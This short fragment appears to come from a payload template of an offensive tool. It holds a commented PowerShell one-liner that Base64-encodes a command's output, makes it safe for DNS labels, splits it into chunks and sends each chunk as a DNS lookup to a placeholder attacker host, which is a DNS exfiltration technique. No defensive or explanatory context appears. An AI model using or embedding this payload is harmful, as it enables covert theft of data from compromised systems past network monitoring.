...
#powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).replace("+","-1").replace("/","-2").replace("=","-3") -split "(.{1,%LABEL_SIZExNLABELS%})"|?{$_}|%{%dns_trigger% $("{0}{1}{2}" -f ($_ -replace "(.{1,%LABEL_SIZE%})",'$1.'),"%STAGE_ID%","%UNIQUE_DNS_HOST%")}
